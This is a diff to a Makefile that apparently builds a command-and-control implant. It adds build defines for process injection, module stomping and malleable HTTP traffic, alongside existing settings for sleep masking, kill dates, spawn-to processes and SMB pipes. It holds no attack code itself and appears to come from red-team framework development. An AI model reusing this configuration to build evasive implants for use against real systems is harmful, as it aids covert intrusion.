@@ -42,7 +42,7 @@ CONFIG_OBJ64 := $(OBJ_PATH)/Config.x64.obj
 CONFIG_OBJ86 := $(OBJ_PATH)/Config.x86.obj
 
 # ASM objects
-ASM_OBJ64 := $(OBJ_PATH)/syscall_asm.x64.obj $(OBJ_PATH)/entry_asm.x64.obj $(OBJ_PATH)/spoof_asm.x64.obj
+ASM_OBJ64 := $(OBJ_PATH)/entry_asm.x64.obj $(OBJ_PATH)/spoof_asm.x64.obj
 ASM_OBJ86 := $(OBJ_PATH)/entry.x86.obj
 
 # All objects for final link
@@ -68,27 +68,20 @@ DEFS := \
 	-D KH_KILLDATE_MONTH=${KH_KILLDATE_MONTH} \
 	-D KH_KILLDATE_YEAR=${KH_KILLDATE_YEAR} \
     -D KH_SLEEP_TIME=$(KH_SLEEP_TIME) \
+	-D KH_INJECTION_ID=$(KH_INJECTION_ID) \
+	-D KH_STOMP_MODULE='L"$(KH_STOMP_MODULE)"' \
 	-D KH_JITTER=$(KH_JITTER) \
-    -D KH_SPAWNTO_X64='"$(KH_SPAWNTO_X64)"' \
+    -D KH_SPAWNTO_X64='L"$(KH_SPAWNTO_X64)"' \
     -D KH_INJECTION_PE=$(KH_INJECTION_PE) \
     -D KH_INJECTION_SC=$(KH_INJECTION_SC) \
     -D KH_HEAP_MASK=$(KH_HEAP_MASK) \
     -D KH_SLEEP_MASK=$(KH_SLEEP_MASK) \
-    -D WEB_HOST=$(WEB_HOST) \
-	-D WEB_HOST_QTT=$(WEB_HOST_QTT) \
-    -D WEB_PORT=$(WEB_PORT) \
-	-D WEB_METHOD='L"$(WEB_METHOD)"' \
-	-D WEB_PORT_QTT=$(WEB_PORT_QTT) \
-	-D WEB_SECURE_ENABLED=${WEB_SECURE_ENABLED} \
-    -D WEB_ENDPOINT=$(WEB_ENDPOINT) \
-	-D WEB_ENDPOINT_QTT=$(WEB_ENDPOINT_QTT) \
-    -D WEB_USER_AGENT='L"$(WEB_USER_AGENT)"' \
-	-D WEB_HTTP_HEADERS='L"$(WEB_HTTP_HEADERS)"' \
-	-D WEB_HTTP_COOKIES='L"${WEB_HTTP_COOKIES}"' \
-	-D WEB_PROXY_ENABLED=${WEB_PROXY_ENABLED} \
-	-D WEB_PROXY_URL='L"$(WEB_PROXY_URL)"' \
-	-D WEB_PROXY_PASSWORD='L"$(WEB_PROXY_PASSWORD)"' \
-	-D WEB_PROXY_USERNAME='L"$(WEB_PROXY_USERNAME)"' \
+	-D HTTP_MALLEABLE_BYTES=${HTTP_MALLEABLE_BYTES} \
+	-D HTTP_SECURE_ENABLED=${WEB_SECURE_ENABLED} \
+	-D HTTP_PROXY_ENABLED=${WEB_PROXY_ENABLED} \
+	-D HTTP_PROXY_URL='L"$(WEB_PROXY_URL)"' \
+	-D HTTP_PROXY_PASSWORD='L"$(WEB_PROXY_PASSWORD)"' \
+	-D HTTP_PROXY_USERNAME='L"$(WEB_PROXY_USERNAME)"' \
 	-D SMB_PIPE_NAME=${SMB_PIPE_NAME} \
 
 .PHONY: all release debug x64 x86 x64-debug x86-debug prebuild-x64 prebuild-x86 clean show-prebuild force_config
@@ -164,7 +157,6 @@ force_config:
 # ==================== ASM TARGETS ====================
 nasm64:
 	@ mkdir -p $(OBJ_PATH)
-	@ $(ASMCC) -f win64 Source/Asm/Syscall.x64.asm -o $(OBJ_PATH)/syscall_asm.x64.obj
 	@ $(ASMCC) -f win64 Source/Asm/Entry.x64.asm -o $(OBJ_PATH)/entry_asm.x64.obj
 	@ $(ASMCC) -f win64 Source/Asm/Spoof.x64.asm -o $(OBJ_PATH)/spoof_asm.x64.obj
 
